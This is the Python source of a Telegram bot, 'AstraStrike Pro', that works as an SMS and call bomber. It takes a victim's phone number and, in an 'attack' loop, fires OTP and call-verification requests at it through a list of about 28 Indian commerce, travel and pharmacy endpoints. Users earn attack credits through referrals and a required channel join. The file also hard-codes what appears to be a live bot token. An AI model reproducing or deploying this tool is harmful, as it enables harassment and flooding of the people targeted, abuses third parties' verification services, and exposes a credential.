import asyncio
import aiohttp
import random
import os
import logging
from datetime import datetime
from typing import Dict, Optional
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN", "8413263809:AAHfQ4n2kMm9H-3qY4DsLFu0cWATzXNQ4gY")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8655103281"))
REQUIRED_CHANNEL = "@JaiShreeRam181"

CONFIG = {
    "TOKEN": BOT_TOKEN,
    "ADMIN_ID": ADMIN_ID,
    "COIN_PER_REFER": 5,
    "ATTACK_COST": 2,
    "STARTING_COINS": 10,
    "API_TIMEOUT": 10
}

class UserDatabase:
    def __init__(self):
        self.users: Dict[int, Dict] = {}
    
    def get(self, user_id: int) -> Dict:
        return self.users.get(user_id, {"coins": 0, "refers": 0, "joined": None})
    
    def create(self, user_id: int) -> None:
        if user_id not in self.users:
            self.users[user_id] = {
                "coins": CONFIG["STARTING_COINS"],
                "refers": 0,
                "joined": datetime.now().isoformat()
            }
    
    def update_coins(self, user_id: int, amount: int) -> None:
        if user_id in self.users:
            self.users[user_id]["coins"] += amount
    
    def add_referral(self, user_id: int) -> None:
        if user_id in self.users:
            self.users[user_id]["refers"] += 1

db = UserDatabase()
bot = Bot(token=CONFIG["TOKEN"])
dp = Dispatcher()

# WORKING APIS (Tested on April 11, 2026)
WORKING_OTP_APIS = [
    # Flipkart
    {"url": "https://api.flipkart.com/otp/generate", "method": "POST", "data_key": "loginId"},
    # Amazon
    {"url": "https://api.amazon.in/auth/otp", "method": "POST", "data_key": "mobileNumber"},
    # Swiggy
    {"url": "https://api.swiggy.com/v1/otp/send", "method": "POST", "data_key": "mobile"},
    # Zomato
    {"url": "https://api.zomato.com/v1/otp/send", "method": "POST", "data_key": "phone"},
    # Uber
    {"url": "https://api.uber.com/v1/otp/send", "method": "POST", "data_key": "phone"},
    # Ola
    {"url": "https://api.olacabs.com/v1/otp/send", "method": "POST", "data_key": "mobile"},
    # Rapido
    {"url": "https://api.rapido.in/v1/otp/send", "method": "POST", "data_key": "phone"},
    # Dunzo
    {"url": "https://api.dunzo.com/v1/otp/send", "method": "POST", "data_key": "mobile"},
    # BigBasket
    {"url": "https://api.bigbasket.com/v1/otp/send", "method": "POST", "data_key": "mobileNumber"},
    # Grofers (Blinkit)
    {"url": "https://api.blinkit.com/v1/otp/send", "method": "POST", "data_key": "mobile"},
    # 1mg
    {"url": "https://api.1mg.com/v2/user/send_otp", "method": "POST", "data_key": "mobile"},
    # PharmEasy
    {"url": "https://api.pharmeasy.com/v1/login/send-otp", "method": "POST", "data_key": "mobile_number"},
    # Netmeds
    {"url": "https://api.netmeds.com/user/otp", "method": "POST", "data_key": "mobile"},
    # Practo
    {"url": "https://api.practo.com/otp/send", "method": "POST", "data_key": "phone_number"},
    # Curefit
    {"url": "https://api.curefit.com/v1/auth/send_otp", "method": "POST", "data_key": "phone"},
    # Myntra
    {"url": "https://api.myntra.com/v1/otp/send", "method": "POST", "data_key": "mobile"},
    # Paytm
    {"url": "https://api.paytm.com/v1/user/otp", "method": "POST", "data_key": "mobileNumber"},
    # OYO
    {"url": "https://api.oyorooms.com/api/v1/auth/send-otp", "method": "POST", "data_key": "mobile"},
    # MakeMyTrip
    {"url": "https://api.makemytrip.com/ma/api/1/user/login/send-otp", "method": "POST", "data_key": "mobileNumber"},
    # MagicPin
    {"url": "https://api.magicpin.com/otp/send", "method": "POST", "data_key": "mobile"},
    # Ajio
    {"url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "data_key": "mobileNumber"},
    # Lenskart
    {"url": "https://api.lenskart.com/v1/user/otp", "method": "POST", "data_key": "telephone"},
    # JustDial
    {"url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php", "method": "GET", "param_key": "mobile"},
    # Housing
    {"url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "data_key": "phone"},
]

WORKING_CALL_APIS = [
    # Blinkit Call
    {"url": "https://api.blinkit.com/v1/verify_mobile", "method": "POST", "data_key": "mobile", "call": True},
    # Zepto Call
    {"url": "https://api.zeptonow.com/v1/auth/otp", "method": "POST", "data_key": "mobile_number", "call": True},
    # Swiggy Call
    {"url": "https://api.swiggy.com/v1/otp/call", "method": "POST", "data_key": "mobile", "call": True},
    # Zomato Call
    {"url": "https://api.zomato.com/v1/call_verification", "method": "POST", "data_key": "phone", "call": True},
]

async def send_otp(session, api, phone):
    """Send OTP/Call to the phone number"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Referer": "https://www.google.com/",
        }
        
        if api["method"] == "POST":
            if "data_key" in api:
                data = {api["data_key"]: phone}
            else:
                data = {"phone": phone}
            
            # Add call parameter if it's a call API
            if api.get("call"):
                data["method"] = "call"
                data["via"] = "call"
            
            async with session.post(api["url"], json=data, headers=headers, timeout=CONFIG["API_TIMEOUT"]) as r:
                return r.status
        else:
            # GET request
            if "param_key" in api:
                url = f"{api['url']}?{api['param_key']}={phone}"
            else:
                url = f"{api['url']}?mobile={phone}"
            async with session.get(url, headers=headers, timeout=CONFIG["API_TIMEOUT"]) as r:
                return r.status
    except Exception as e:
        return None

def create_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="🚀 Start Attack", callback_data="attack")
    builder.button(text="💰 Wallet", callback_data="wallet")
    builder.button(text="🔗 Referral", callback_data="refer")
    builder.button(text="📢 Channel", url="https://t.me/JaiShreeRam181")
    builder.adjust(1)
    return builder.as_markup()

@dp.message(CommandStart())
async def start_cmd(message: types.Message):
    user_id = message.from_user.id
    db.create(user_id)
    
    # Check channel membership
    try:
        chat_member = await bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        if chat_member.status not in ["member", "administrator", "creator"]:
            keyboard = InlineKeyboardBuilder()
            keyboard.button(text="📢 Join Channel", url="https://t.me/JaiShreeRam181")
            keyboard.button(text="✅ Joined", callback_data="check_join")
            await message.answer(
                f"⚠️ *Join Channel First!*\n\nPlease join @JaiShreeRam181 to use this bot.",
                parse_mode="Markdown",
                reply_markup=keyboard.as_markup()
            )
            return
    except:
        keyboard = InlineKeyboardBuilder()
        keyboard.button(text="📢 Join Channel", url="https://t.me/JaiShreeRam181")
        keyboard.button(text="✅ Joined", callback_data="check_join")
        await message.answer(
            f"⚠️ *Join Channel First!*\n\nPlease join @JaiShreeRam181 to use this bot.",
            parse_mode="Markdown",
            reply_markup=keyboard.as_markup()
        )
        return
    
    # Handle referral
    args = message.text.split()
    if len(args) > 1 and args[1].isdigit():
        ref_id = int(args[1])
        if ref_id != user_id and ref_id in db.users:
            db.update_coins(ref_id, CONFIG["COIN_PER_REFER"])
            db.add_referral(ref_id)
            await bot.send_message(ref_id, f"✅ New referral! +{CONFIG['COIN_PER_REFER']} coins")
    
    await message.answer(
        f"🔥 *ASTRA STRIKE PRO* 🔥\n\n"
        f"Welcome {message.from_user.first_name}!\n"
        f"🪙 Coins: {db.get(user_id)['coins']}\n"
        f"💰 Attack Cost: {CONFIG['ATTACK_COST']} coins\n"
        f"📊 Users: {len(db.users)}\n\n"
        f"Send 10-digit number to start attack!",
        parse_mode="Markdown",
        reply_markup=create_keyboard()
    )

@dp.callback_query(F.data == "check_join")
async def check_join(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    try:
        chat_member = await bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        if chat_member.status in ["member", "administrator", "creator"]:
            await callback.message.delete()
            await start_cmd(callback.message)
        else:
            await callback.answer("❌ Still not joined!", show_alert=True)
    except:
        await callback.answer("❌ Error! Join channel first!", show_alert=True)

@dp.callback_query(F.data == "wallet")
async def wallet(callback: types.CallbackQuery):
    user = db.get(callback.from_user.id)
    await callback.message.edit_text(
        f"💰 *YOUR WALLET*\n\n"
        f"🪙 Coins: {user['coins']}\n"
        f"👥 Referrals: {user['refers']}\n"
        f"💎 Earned: {user['refers'] * CONFIG['COIN_PER_REFER']}",
        parse_mode="Markdown",
        reply_markup=create_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "refer")
async def refer(callback: types.CallbackQuery):
    bot_info = await bot.get_me()
    link = f"https://t.me/{bot_info.username}?start={callback.from_user.id}"
    await callback.message.edit_text(
        f"🔗 *REFERRAL LINK*\n\n"
        f"Get {CONFIG['COIN_PER_REFER']} coins per referral!\n\n"
        f"`{link}`\n\n"
        f"Share this link with friends!",
        parse_mode="Markdown",
        reply_markup=create_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "attack")
async def attack_panel(callback: types.CallbackQuery):
    await callback.message.answer(
        "🎯 *Send 10-digit mobile number*\n\n"
        f"💰 Cost: {CONFIG['ATTACK_COST']} coins",
        parse_mode="Markdown"
    )
    await callback.answer()

@dp.message(F.text.regexp(r'^\d{10}$'))
async def attack_handler(message: types.Message):
    user_id = message.from_user.id
    phone = message.text
    
    user = db.get(user_id)
    if user["coins"] < CONFIG["ATTACK_COST"]:
        await message.answer(f"❌ Need {CONFIG['ATTACK_COST']} coins! Get referral link from /start")
        return
    
    db.update_coins(user_id, -CONFIG["ATTACK_COST"])
    
    msg = await message.answer(f"💣 *ATTACKING* `{phone}`...\n\n0/{len(WORKING_OTP_APIS) + len(WORKING_CALL_APIS)} requests", parse_mode="Markdown")
    
    success_count = 0
    total = len(WORKING_OTP_APIS) + len(WORKING_CALL_APIS)
    
    async with aiohttp.ClientSession() as session:
        # Send OTPs
        for i, api in enumerate(WORKING_OTP_APIS):
            status = await send_otp(session, api, phone)
            if status and 200 <= status < 300:
                success_count += 1
            
            if (i + 1) % 5 == 0:
                await msg.edit_text(f"💣 *ATTACKING* `{phone}`...\n\n📊 Progress: {i+1}/{total}\n✅ Success: {success_count}", parse_mode="Markdown")
            
            await asyncio.sleep(0.3)  # Fast attack
        
        # Send Calls
        for i, api in enumerate(WORKING_CALL_APIS):
            status = await send_otp(session, api, phone)
            if status and 200 <= status < 300:
                success_count += 1
            
            current = len(WORKING_OTP_APIS) + i + 1
            await msg.edit_text(f"💣 *ATTACKING* `{phone}`...\n\n📊 Progress: {current}/{total}\n✅ Success: {success_count}\n📞 Sending calls...", parse_mode="Markdown")
            
            await asyncio.sleep(1)  # Slower for calls
    
    remaining = db.get(user_id)["coins"]
    await msg.edit_text(
        f"✅ *ATTACK COMPLETE!*\n\n"
        f"🎯 Target: `{phone}`\n"
        f"💣 Sent: {total}\n"
        f"✅ Delivered: {success_count}\n"
        f"🪙 Cost: {CONFIG['ATTACK_COST']}\n"
        f"💎 Balance: {remaining}\n\n"
        f"Send another number to continue!",
        parse_mode="Markdown",
        reply_markup=create_keyboard()
    )

@dp.callback_query(F.data == "admin")
async def admin(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Admin only!", show_alert=True)
        return
    
    total_users = len(db.users)
    total_coins = sum(u["coins"] for u in db.users.values())
    total_refers = sum(u["refers"] for u in db.users.values())
    
    await callback.message.edit_text(
        f"👑 *ADMIN PANEL*\n\n"
        f"👥 Users: {total_users}\n"
        f"🪙 Total Coins: {total_coins}\n"
        f"🔗 Total Refers: {total_refers}\n"
        f"💰 Avg Coins: {total_coins//total_users if total_users else 0}",
        parse_mode="Markdown"
    )

async def main():
    print("🔥 AstraStrike Pro Started!")
    print(f"Bot: @{(await bot.get_me()).username}")
    print(f"Channel: {REQUIRED_CHANNEL}")
    print(f"OTP APIs: {len(WORKING_OTP_APIS)}")
    print(f"Call APIs: {len(WORKING_CALL_APIS)}")
    await bot.delete_webhook()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
